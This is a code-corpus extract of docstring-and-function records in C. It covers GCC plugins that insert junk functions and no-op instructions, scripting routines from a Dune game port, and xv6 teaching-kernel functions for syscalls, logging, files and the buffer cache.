 /* Let the user know how stupid they are */\n    printf(TAG \"Number of junk functions to generate: %d\\n\"\n           TAG \"Maximum number of calls to junk functions: %d\\n\",\n           n_funcs, max_calls);\n\n    return 0;\n}", "path": "slimer\\slimer.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Creates an empty function */\n", "func_signal": "static tree create_junk_fn(void)", "code": "{\n    char fnname[32] = {0};\n    tree decl, resdecl, initial, proto;\n    static unsigned id;\n\n    /* Func decl */\n    ++id;\n    snprintf(fnname, 31, \"__func%u\", id);\n    proto = build_varargs_function_type_list(integer_type_node, NULL_TREE);\n    decl = build_fn_decl(fnname, proto);\n    SET_DECL_ASSEMBLER_NAME(decl, get_identifier(fnname));\n   \n    /* Result */ \n    resdecl=build_decl(BUILTINS_LOCATION,RESULT_DECL,NULL_TREE,integer_type_node);\n    DECL_ARTIFICIAL(resdecl) = 1;\n    DECL_CONTEXT(resdecl) = decl;\n    DECL_RESULT(decl) = resdecl;\n    \n    /* Initial */\n    initial = make_node(BLOCK);\n    TREE_USED(initial) = 1;\n    DECL_INITIAL(decl) = initial;\n    DECL_UNINLINABLE(decl) = 1;\n    DECL_EXTERNAL(decl) = 0;\n    DECL_PRESERVE_P(decl) = 1;\n\n    /* Func decl */\n    TREE_USED(decl) = 1;\n    TREE_PUBLIC(decl) = 1;\n    TREE_STATIC(decl) = 1;\n    DECL_ARTIFICIAL(decl) = 1;\n\n    /* Make the function */\n    push_struct_function(decl);\n    cfun->function_end_locus = BUILTINS_LOCATION;\n    gimplify_function_tree(decl);\n\n    /* Update */\n    cgraph_add_new_function(decl, false);\n    pop_cfun();\n\n    /* Add to a vec of all junk funs we maintain */\n    junk_fns.safe_push(decl);\n\n    printf(\"Created unkfn\\n\");\n\n    return decl;\n}", "path": "jpanic\\jpanic.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Insert a nop instruction before this statement */\n", "func_signal": "static void insert_nop(gimple_stmt_iterator gsi)", "code": "{\n    gimple nop;\n    nop = gimple_build_asm_vec(\"mov %%eax, %%eax\", NULL, NULL, NULL, NULL);\n    gsi_insert_before(&gsi, nop, GSI_NEW_STMT);\n}", "path": "nopper\\nopper.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Global value for the number of nops to insert */\n", "func_signal": "static unsigned int nopper_exec(void)", "code": "{\n    int i;\n    basic_block bb;\n    gimple_stmt_iterator gsi;\n    static int nops_per_stmt = 0;\n    static int counted_stmts = 0;\n\n    /* Only initialized once */\n    if (!counted_stmts)\n    {\n        if (!(counted_stmts = count_stmts()))\n          return -EINVAL;\n\n        if (n_nops <= 0)\n          n_nops = counted_stmts * 5;\n\n        nops_per_stmt = n_nops / counted_stmts;\n\n        printf(\"[nopper] Inserting %d nops between %d statements\\n\",\n               n_nops, counted_stmts);\n    }\n\n    if (ignore_fn(current_function_decl)) \n      return 0;;\n\n    /* Get nopping! */\n    FOR_EACH_BB_FN(bb, cfun) \n      for (gsi=gsi_start_bb(bb); !gsi_end_p(gsi); gsi_next(&gsi))\n        for (i=0; i<nops_per_stmt; ++i)\n          insert_nop(gsi);\n    \n    return 0;\n}", "path": "nopper\\nopper.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/* Craete a NOP (junk) instruction statement. \n * Returns the junk statement created\n */\n", "func_signal": "static gimple create_junk_stmt(void)", "code": "{\n    tree node;\n    gimple stmt;\n    junk_type_e junk_type;\n\n    /* Choose a thing to insert */\n    junk_type = (junk_type_e)(rand() % N_JUNK_TYPES);\n    switch (junk_type)\n    {\n        case JUNK_ASSIGN:\n            stmt = build_junk_assign();\n            break;\n        \n        case JUNK_ADD:\n        case JUNK_SUB:\n        case JUNK_MUL:\n            stmt = build_junk_math(junk_type);\n            break;\n        \n        case JUNK_NEW_FN:\n            /* Do not add a call to a junk function if we are one */\n            if (!is_junk_fn(cfun->decl))\n            {\n                node = create_junk_fn();\n                stmt = gimple_build_call(node, 0);\n            }\n            else\n              stmt = gimple_build_nop();\n            break;\n\n        case JUNK_OLD_FN:\n            /* Do not add a call to a junk function if we are one */\n            if (!is_junk_fn(cfun->decl))\n            {\n                node = find_junk_fn();\n                stmt = gimple_build_call(node, 0);\n            }\n            else\n              stmt = gimple_build_nop();\n            break;\n\n        default:\n            abort();\n    }\n\n    return stmt;\n}", "path": "jpanic\\jpanic.c", "repo_name": "enferex/GOAT-Plugs", "stars": 70, "license": "None", "language": "c", "size": 150}
{"docstring": "/**\n * Suspend the script execution for a randomized amount of ticks, with an\n *  upper limit given.\n *\n * Stack: 1 - maximum amount of delay in ticks.\n *\n * @param script The script engine to operate on.\n * @return Amount of ticks the script will be suspended, divided by 5.\n */\n", "func_signal": "uint16 Script_General_DelayRandom(ScriptEngine *script)", "code": "{\n\tuint16 delay;\n\n\tdelay = Tools_Random_256() * STACK_PEEK(1) / 256;\n\tdelay /= 5;\n\n\tscript->delay = delay;\n\n\treturn delay;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Draws a string.\n *\n * Stack: 1 - The index of the string to draw.\n *        2-4 - The arguments for the string.\n *\n * @param script The script engine to operate on.\n * @return The value 0. Always.\n */\n", "func_signal": "uint16 Script_General_DisplayText(ScriptEngine *script)", "code": "{\n\tchar *text;\n\tuint16 offset;\n\n\toffset = BETOH16(*(script->scriptInfo->text + STACK_PEEK(1)));\n\ttext = (char *)script->scriptInfo->text + offset;\n\n\tGUI_DisplayText(text, 0, STACK_PEEK(2), STACK_PEEK(3), STACK_PEEK(4));\n\n\treturn 0;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Gets the type of the current object's linked unit.\n *\n * Stack: *none*.\n *\n * @param script The script engine to operate on.\n * @return The type, or 0xFFFF if no linked unit.\n */\n", "func_signal": "uint16 Script_General_GetLinkedUnitType(ScriptEngine *script)", "code": "{\n\tuint16 linkedID;\n\n\tVARIABLE_NOT_USED(script);\n\n\tlinkedID = g_scriptCurrentObject->linkedID;\n\n\tif (linkedID == 0xFF) return 0xFFFF;\n\n\treturn Unit_Get_ByIndex(linkedID)->o.type;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Display a modal message.\n *\n * Stack: 1 - The index of a string.\n *\n * @param script The script engine to operate on.\n * @return unknown.\n */\n", "func_signal": "uint16 Script_General_DisplayModalMessage(ScriptEngine *script)", "code": "{\n\tchar *text;\n\tuint16 offset;\n\n\toffset = BETOH16(*(script->scriptInfo->text + STACK_PEEK(1)));\n\ttext = (char *)script->scriptInfo->text + offset;\n\n\treturn Async_GUI_DisplayModalMessage(text, 0xFFFF);\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Get the distance from the current unit/structure to the unit/structure.\n *\n * Stack: 1 - An encoded unit/structure index.\n *\n * @param script The script engine to operate on.\n * @return Distance to it, where distance is (longest(x,y) + shortest(x,y) / 2).\n */\n", "func_signal": "uint16 Script_General_GetDistanceToObject(ScriptEngine *script)", "code": "{\n\tuint16 index;\n\n\tindex = STACK_PEEK(1);\n\n\tif (!Tools_Index_IsValid(index)) return 0xFFFF;\n\n\treturn Object_GetDistanceToEncoded(g_scriptCurrentObject, index);\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Check if a Unit/Structure is an enemy.\n *\n * Stack: 1 - An encoded index.\n *\n * @param script The script engine to operate on.\n * @return Zero if and only if the Unit/Structure is friendly.\n */\n", "func_signal": "uint16 Script_General_IsEnemy(ScriptEngine *script)", "code": "{\n\tuint8 houseID;\n\tuint16 index;\n\n\tindex = STACK_PEEK(1);\n\n\tif (!Tools_Index_IsValid(index)) return 0;\n\n\thouseID = g_scriptCurrentObject->houseID;\n\n\tswitch (Tools_Index_GetType(index)) {\n\t\tcase IT_UNIT:      return (Unit_GetHouseID(Tools_Index_GetUnit(index)) != houseID) ? 1 : 0;\n\t\tcase IT_STRUCTURE: return (Tools_Index_GetStructure(index)->o.houseID != houseID) ? 1 : 0;\n\t\tdefault:           return 0;\n\t}\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Gets the type of the given encoded index.\n *\n * Stack: 1 - An encoded index.\n *\n * @param script The script engine to operate on.\n * @return The type, or 0xFFFF if invalid.\n */\n", "func_signal": "uint16 Script_General_GetIndexType(ScriptEngine *script)", "code": "{\n\tuint16 index;\n\n\tindex = STACK_PEEK(1);\n\n\tif (!Tools_Index_IsValid(index)) return 0xFFFF;\n\n\treturn Tools_Index_GetType(index);\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Saves the game options.\n */\n", "func_signal": "void GameOptions_Save()", "code": "{\n\tuint8 index;\n\n\tindex = File_Open(\"OPTIONS.CFG\", 2);\n\n\tFile_Write(index, &g_gameConfig, sizeof(g_gameConfig));\n\n\tFile_Close(index);\n\n\tif (g_gameConfig.music == 0) Music_Play(0);\n}", "path": "C\\src\\config.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Two sided function. If the parameter is an index, it will return 1 if and\n *  only if the structure indicated is idle. If the parameter is not an index,\n *  it is a structure type, and this function will return the first structure\n *  that is of that type and idle.\n *\n * Stack: 1 - An encoded index or a Structure type.\n *\n * @param script The script engine to operate on.\n * @return Zero or one to indicate idle, or the index of the structure which is idle, depending on the input parameter.\n */\n", "func_signal": "uint16 Script_General_FindIdle(ScriptEngine *script)", "code": "{\n\tuint8 houseID;\n\tuint16 index;\n\tStructure *s;\n\tPoolFindStruct find;\n\n\tindex = STACK_PEEK(1);\n\n\thouseID = g_scriptCurrentObject->houseID;\n\n\tif (Tools_Index_GetType(index) == IT_UNIT) return 0;\n\tif (Tools_Index_GetType(index) == IT_TILE) return 0;\n\n\tif (Tools_Index_GetType(index) == IT_STRUCTURE) {\n\t\ts = Tools_Index_GetStructure(index);\n\t\tif (s->o.houseID != houseID) return 0;\n\t\tif (s->state != STRUCTURE_STATE_IDLE) return 0;\n\t\treturn 1;\n\t}\n\n\tfind.houseID = houseID;\n\tfind.index   = 0xFFFF;\n\tfind.type    = index;\n\n\twhile (true) {\n\t\ts = Structure_Find(&find);\n\t\tif (s == NULL) return 0;\n\t\tif (s->state != STRUCTURE_STATE_IDLE) continue;\n\t\treturn Tools_Index_Encode(s->o.index, IT_STRUCTURE);\n\t}\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Suspend the script execution for a set amount of ticks.\n *\n * Stack: 1 - delay value in ticks.\n *\n * @param script The script engine to operate on.\n * @return Amount of ticks the script will be suspended, divided by 5.\n *\n * @note Scripts are executed every 5 ticks, so the delay is divided by 5. You\n *  can't delay your script for 4 ticks or less.\n */\n", "func_signal": "uint16 Script_General_Delay(ScriptEngine *script)", "code": "{\n\tuint16 delay;\n\n\tdelay = STACK_PEEK(1) / 5;\n\n\tscript->delay = delay;\n\n\treturn delay;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Get the distance from the current unit/structure to the tile.\n *\n * Stack: 1 - An encoded tile index.\n *\n * @param script The script engine to operate on.\n * @return Distance to it, where distance is (longest(x,y) + shortest(x,y) / 2).\n */\n", "func_signal": "uint16 Script_General_GetDistanceToTile(ScriptEngine *script)", "code": "{\n\tObject *o;\n\tuint16 encoded;\n\n\tencoded = STACK_PEEK(1);\n\to = g_scriptCurrentObject;\n\n\tif (!Tools_Index_IsValid(encoded)) return 0xFFFF;\n\n\treturn Tile_GetDistance(o->position, Tools_Index_GetTile(encoded));\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Counts how many unit of the given type are owned by current object's owner.\n *\n * Stack: 1 - An unit type.\n *\n * @param script The script engine to operate on.\n * @return The count.\n */\n", "func_signal": "uint16 Script_General_UnitCount(ScriptEngine *script)", "code": "{\n\tuint16 count = 0;\n\tPoolFindStruct find;\n\n\tfind.houseID = g_scriptCurrentObject->houseID;\n\tfind.type    = STACK_PEEK(1);\n\tfind.index   = 0xFFFF;\n\n\twhile (true) {\n\t\tUnit *u = Unit_Find(&find);\n\t\tif (u == NULL) break;\n\t\tcount++;\n\t}\n\n\treturn count;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Search for spice nearby.\n *\n * Stack: 1 - Radius of the search.\n *\n * @param script The script engine to operate on.\n * @return Encoded position with spice, or \\c 0 if no spice nearby.\n */\n", "func_signal": "uint16 Script_General_SearchSpice(ScriptEngine *script)", "code": "{\n\ttile32 position;\n\tuint16 packedSpicePos;\n\n\tposition = g_scriptCurrentObject->position;\n\n\tpackedSpicePos = Map_SearchSpice(Tile_PackTile(position), STACK_PEEK(1));\n\n\tif (packedSpicePos == 0) return 0;\n\treturn Tools_Index_Encode(packedSpicePos, IT_TILE);\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Check if a Unit/Structure is a friend.\n *\n * Stack: 1 - An encoded index.\n *\n * @param script The script engine to operate on.\n * @return Either 1 (friendly) or -1 (enemy).\n */\n", "func_signal": "uint16 Script_General_IsFriendly(ScriptEngine *script)", "code": "{\n\tuint16 index;\n\tObject *o;\n\tuint16 res;\n\n\tindex = STACK_PEEK(1);\n\n\to = Tools_Index_GetObject(index);\n\n\tif (o == NULL || o->flags.s.isNotOnMap || !o->flags.s.used) return 0;\n\n\tres = Script_General_IsEnemy(script);\n\n\treturn (res == 0) ? 1 : -1;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Loads the game options.\n *\n * @return True if loading is successful.\n */\n", "func_signal": "bool GameOptions_Load()", "code": "{\n\tif (!File_Exists(\"OPTIONS.CFG\")) return false;\n\n\tFile_ReadBlockFile(\"OPTIONS.CFG\", &g_gameConfig, sizeof(g_gameConfig));\n\n\treturn true;\n}", "path": "C\\src\\config.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Do nothing. This function has absolutely no functionality other than\n *  returning the value 0.\n *\n * Stack: *none*\n *\n * @param script The script engine to operate on\n * @return The value 0. Always.\n */\n", "func_signal": "uint16 Script_General_NoOperation(ScriptEngine *script)", "code": "{\n\tVARIABLE_NOT_USED(script);\n\treturn 0;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Unknown function 0288.\n *\n * Stack: 1 - An encoded index.\n *\n * @param script The script engine to operate on.\n * @return unknown.\n */\n", "func_signal": "uint16 Script_General_Unknown0288(ScriptEngine *script)", "code": "{\n\tuint16 index;\n\tStructure *s;\n\n\tindex = STACK_PEEK(1);\n\ts = Tools_Index_GetStructure(index);\n\n\tif (s != NULL && Tools_Index_Encode(s->o.index, IT_STRUCTURE) != index) return 1;\n\n\treturn (Tools_Index_GetObject(index) == NULL) ? 1 : 0;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Play a voice.\n *\n * Stack: 1 - The VoiceID to play.\n *\n * @param script The script engine to operate on.\n * @return The value 0. Always.\n */\n", "func_signal": "uint16 Script_General_VoicePlay(ScriptEngine *script)", "code": "{\n\ttile32 position;\n\n\tposition = g_scriptCurrentObject->position;\n\n\tVoice_PlayAtTile(STACK_PEEK(1), position);\n\n\treturn 0;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Get orientation of a unit.\n *\n * Stack: 1 - An encoded index.\n *\n * @param script The script engine to operate on.\n * @return The orientation of the unit.\n */\n", "func_signal": "uint16 Script_General_GetOrientation(ScriptEngine *script)", "code": "{\n\tUnit *u;\n\n\tu = Tools_Index_GetUnit(STACK_PEEK(1));\n\n\tif (u == NULL) return 128;\n\n\treturn u->orientation[0].current;\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "/**\n * Decodes the given encoded index.\n *\n * Stack: 1 - An encoded index.\n *\n * @param script The script engine to operate on.\n * @return The decoded index, or 0xFFFF if invalid.\n */\n", "func_signal": "uint16 Script_General_DecodeIndex(ScriptEngine *script)", "code": "{\n\tuint16 index;\n\n\tindex = STACK_PEEK(1);\n\n\tif (!Tools_Index_IsValid(index)) return 0xFFFF;\n\n\treturn Tools_Index_Decode(index);\n}", "path": "C\\src\\script\\general.c", "repo_name": "caiiiycuk/play-dune", "stars": 103, "license": "None", "language": "c", "size": 33136}
{"docstring": "// Fetch the nth word-sized system call argument as a string pointer.\n// Check that the pointer is valid and the string is nul-terminated.\n// (There is no shared writable memory, so the string can't change\n// between this check and being used by the kernel.)\n", "func_signal": "int\nargstr(int n, char **pp)", "code": "{\n  int addr;\n  if(argint(n, &addr) < 0)\n    return -1;\n  return fetchstr(proc, addr, pp);\n}", "path": "syscall.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Copy committed blocks from log to their home location\n", "func_signal": "static void \ninstall_trans(void)", "code": "{\n  int tail;\n\n  for (tail = 0; tail < log.lh.n; tail++) {\n    struct buf *lbuf = bread(log.dev, log.start+tail+1); // read log block\n    struct buf *dbuf = bread(log.dev, log.lh.sector[tail]); // read dst\n    memmove(dbuf->data, lbuf->data, BSIZE);  // copy block to dst\n    bwrite(dbuf);  // write dst to disk\n    brelse(lbuf); \n    brelse(dbuf);\n  }\n}", "path": "log.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Caller has modified b->data and is done with the buffer.\n// Append the block to the log and record the block number, \n// but don't write the log header (which would commit the write).\n// log_write() replaces bwrite(); a typical use is:\n//   bp = bread(...)\n//   modify bp->data[]\n//   log_write(bp)\n//   brelse(bp)\n", "func_signal": "void\nlog_write(struct buf *b)", "code": "{\n  int i;\n\n  if (log.lh.n >= LOGSIZE || log.lh.n >= log.size - 1)\n    panic(\"too big a transaction\");\n  if (!log.busy)\n    panic(\"write outside of trans\");\n\n  for (i = 0; i < log.lh.n; i++) {\n    if (log.lh.sector[i] == b->sector)   // log absorbtion?\n      break;\n  }\n  log.lh.sector[i] = b->sector;\n  struct buf *lbuf = bread(b->dev, log.start+i+1);\n  memmove(lbuf->data, b->data, BSIZE);\n  bwrite(lbuf);\n  brelse(lbuf);\n  if (i == log.lh.n)\n    log.lh.n++;\n  b->flags |= B_DIRTY; // XXX prevent eviction\n}", "path": "log.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Allocate a file structure.\n", "func_signal": "struct file*\nfilealloc(void)", "code": "{\n  struct file *f;\n\n  acquire(&ftable.lock);\n  for(f = ftable.file; f < ftable.file + NFILE; f++){\n    if(f->ref == 0){\n      f->ref = 1;\n      release(&ftable.lock);\n      return f;\n    }\n  }\n  release(&ftable.lock);\n  return 0;\n}", "path": "file.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Fetch the nth word-sized system call argument as a pointer\n// to a block of memory of size n bytes.  Check that the pointer\n// lies within the process address space.\n", "func_signal": "int\nargptr(int n, char **pp, int size)", "code": "{\n  int i;\n  \n  if(argint(n, &i) < 0)\n    return -1;\n  if((uint)i >= proc->sz || (uint)i+size > proc->sz)\n    return -1;\n  *pp = (char*)i;\n  return 0;\n}", "path": "syscall.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Read a single sector at offset into dst.\n", "func_signal": "void\nreadsect(void *dst, uint offset)", "code": "{\n  // Issue command.\n  waitdisk();\n  outb(0x1F2, 1);   // count = 1\n  outb(0x1F3, offset);\n  outb(0x1F4, offset >> 8);\n  outb(0x1F5, offset >> 16);\n  outb(0x1F6, (offset >> 24) | 0xE0);\n  outb(0x1F7, 0x20);  // cmd 0x20 - read sectors\n\n  // Read data.\n  waitdisk();\n  insl(0x1F0, dst, SECTSIZE/4);\n}", "path": "bootmain.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Read 'count' bytes at 'offset' from kernel into physical address 'pa'.\n// Might copy more than asked.\n", "func_signal": "void\nreadseg(uchar* pa, uint count, uint offset)", "code": "{\n  uchar* epa;\n\n  epa = pa + count;\n\n  // Round down to sector boundary.\n  pa -= offset % SECTSIZE;\n\n  // Translate from bytes to sectors; kernel starts at sector 1.\n  offset = (offset / SECTSIZE) + 1;\n\n  // If this is too slow, we could read lots of sectors at a time.\n  // We'd write more to memory than asked, but it doesn't matter --\n  // we load in increasing order.\n  for(; pa < epa; pa += SECTSIZE, offset++)\n    readsect(pa, offset);\n}", "path": "bootmain.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Control-x\n", "func_signal": "void\nconsoleintr(int (*getc)(void))", "code": "{\n  int c;\n\n  acquire(&input.lock);\n  while((c = getc()) >= 0){\n    switch(c){\n    case C('P'):  // Process listing.\n      procdump();\n      break;\n    case C('U'):  // Kill line.\n      while(input.e != input.w &&\n            input.buf[(input.e-1) % INPUT_BUF] != '\\n'){\n        input.e--;\n        consputc(BACKSPACE);\n      }\n      break;\n    case C('H'): case '\\x7f':  // Backspace\n      if(input.e != input.w){\n        input.e--;\n        consputc(BACKSPACE);\n      }\n      break;\n    default:\n      if(c != 0 && input.e-input.r < INPUT_BUF){\n        c = (c == '\\r') ? '\\n' : c;\n        input.buf[input.e++ % INPUT_BUF] = c;\n        consputc(c);\n        if(c == '\\n' || c == C('D') || input.e == input.r+INPUT_BUF){\n          input.w = input.e;\n          wakeup(&input.r);\n        }\n      }\n      break;\n    }\n  }\n  release(&input.lock);\n}", "path": "console.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Fetch the int at addr from process p.\n", "func_signal": "int\nfetchint(struct proc *p, uint addr, int *ip)", "code": "{\n  if(addr >= p->sz || addr+4 > p->sz)\n    return -1;\n  *ip = *(int*)(addr);\n  return 0;\n}", "path": "syscall.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Fetch the nul-terminated string at addr from process p.\n// Doesn't actually copy the string - just sets *pp to point at it.\n// Returns length of string, not including nul.\n", "func_signal": "int\nfetchstr(struct proc *p, uint addr, char **pp)", "code": "{\n  char *s, *ep;\n\n  if(addr >= p->sz)\n    return -1;\n  *pp = (char*)addr;\n  ep = (char*)p->sz;\n  for(s = *pp; s < ep; s++)\n    if(*s == 0)\n      return s - *pp;\n  return -1;\n}", "path": "syscall.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Write in-memory log header to disk.\n// This is the true point at which the\n// current transaction commits.\n", "func_signal": "static void\nwrite_head(void)", "code": "{\n  struct buf *buf = bread(log.dev, log.start);\n  struct logheader *hb = (struct logheader *) (buf->data);\n  int i;\n  hb->n = log.lh.n;\n  for (i = 0; i < log.lh.n; i++) {\n    hb->sector[i] = log.lh.sector[i];\n  }\n  bwrite(buf);\n  brelse(buf);\n}", "path": "log.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "//PAGEBREAK!\n// Write to file f.\n", "func_signal": "int\nfilewrite(struct file *f, char *addr, int n)", "code": "{\n  int r;\n\n  if(f->writable == 0)\n    return -1;\n  if(f->type == FD_PIPE)\n    return pipewrite(f->pipe, addr, n);\n  if(f->type == FD_INODE){\n    // write a few blocks at a time to avoid exceeding\n    // the maximum log transaction size, including\n    // i-node, indirect block, allocation blocks,\n    // and 2 blocks of slop for non-aligned writes.\n    // this really belongs lower down, since writei()\n    // might be writing a device like the console.\n    int max = ((LOGSIZE-1-1-2) / 2) * 512;\n    int i = 0;\n    while(i < n){\n      int n1 = n - i;\n      if(n1 > max)\n        n1 = max;\n\n      begin_trans();\n      ilock(f->ip);\n      if ((r = writei(f->ip, addr + i, f->off, n1)) > 0)\n        f->off += r;\n      iunlock(f->ip);\n      commit_trans();\n\n      if(r < 0)\n        break;\n      if(r != n1)\n        panic(\"short filewrite\");\n      i += r;\n    }\n    return i == n ? n : -1;\n  }\n  panic(\"filewrite\");\n}", "path": "file.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Return a B_BUSY buf with the contents of the indicated disk sector.\n", "func_signal": "struct buf*\nbread(uint dev, uint sector)", "code": "{\n  struct buf *b;\n\n  b = bget(dev, sector);\n  if(!(b->flags & B_VALID))\n    iderw(b);\n  return b;\n}", "path": "bio.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// CGA memory\n", "func_signal": "static void\ncgaputc(int c)", "code": "{\n  int pos;\n  \n  // Cursor position: col + 80*row.\n  outb(CRTPORT, 14);\n  pos = inb(CRTPORT+1) << 8;\n  outb(CRTPORT, 15);\n  pos |= inb(CRTPORT+1);\n\n  if(c == '\\n')\n    pos += 80 - pos%80;\n  else if(c == BACKSPACE){\n    if(pos > 0) --pos;\n  } else\n    crt[pos++] = (c&0xff) | 0x0700;  // black on white\n  \n  if((pos/80) >= 24){  // Scroll up.\n    memmove(crt, crt+80, sizeof(crt[0])*23*80);\n    pos -= 80;\n    memset(crt+pos, 0, sizeof(crt[0])*(24*80 - pos));\n  }\n  \n  outb(CRTPORT, 14);\n  outb(CRTPORT+1, pos>>8);\n  outb(CRTPORT, 15);\n  outb(CRTPORT+1, pos);\n  crt[pos] = ' ' | 0x0700;\n}", "path": "console.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Read the log header from disk into the in-memory log header\n", "func_signal": "static void\nread_head(void)", "code": "{\n  struct buf *buf = bread(log.dev, log.start);\n  struct logheader *lh = (struct logheader *) (buf->data);\n  int i;\n  log.lh.n = lh->n;\n  for (i = 0; i < log.lh.n; i++) {\n    log.lh.sector[i] = lh->sector[i];\n  }\n  brelse(buf);\n}", "path": "log.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Close file f.  (Decrement ref count, close when reaches 0.)\n", "func_signal": "void\nfileclose(struct file *f)", "code": "{\n  struct file ff;\n\n  acquire(&ftable.lock);\n  if(f->ref < 1)\n    panic(\"fileclose\");\n  if(--f->ref > 0){\n    release(&ftable.lock);\n    return;\n  }\n  ff = *f;\n  f->ref = 0;\n  f->type = FD_NONE;\n  release(&ftable.lock);\n  \n  if(ff.type == FD_PIPE)\n    pipeclose(ff.pipe, ff.writable);\n  else if(ff.type == FD_INODE){\n    begin_trans();\n    iput(ff.ip);\n    commit_trans();\n  }\n}", "path": "file.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Look through buffer cache for sector on device dev.\n// If not found, allocate fresh block.\n// In either case, return B_BUSY buffer.\n", "func_signal": "static struct buf*\nbget(uint dev, uint sector)", "code": "{\n  struct buf *b;\n\n  acquire(&bcache.lock);\n\n loop:\n  // Is the sector already cached?\n  for(b = bcache.head.next; b != &bcache.head; b = b->next){\n    if(b->dev == dev && b->sector == sector){\n      if(!(b->flags & B_BUSY)){\n        b->flags |= B_BUSY;\n        release(&bcache.lock);\n        return b;\n      }\n      sleep(b, &bcache.lock);\n      goto loop;\n    }\n  }\n\n  // Not cached; recycle some non-busy and clean buffer.\n  for(b = bcache.head.prev; b != &bcache.head; b = b->prev){\n    if((b->flags & B_BUSY) == 0 && (b->flags & B_DIRTY) == 0){\n      b->dev = dev;\n      b->sector = sector;\n      b->flags = B_BUSY;\n      release(&bcache.lock);\n      return b;\n    }\n  }\n  panic(\"bget: no buffers\");\n}", "path": "bio.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
{"docstring": "// Write b's contents to disk.  Must be B_BUSY.\n", "func_signal": "void\nbwrite(struct buf *b)", "code": "{\n  if((b->flags & B_BUSY) == 0)\n    panic(\"bwrite\");\n  b->flags |= B_DIRTY;\n  iderw(b);\n}", "path": "bio.c", "repo_name": "bringhurst/xv6", "stars": 76, "license": "other", "language": "c", "size": 12188}
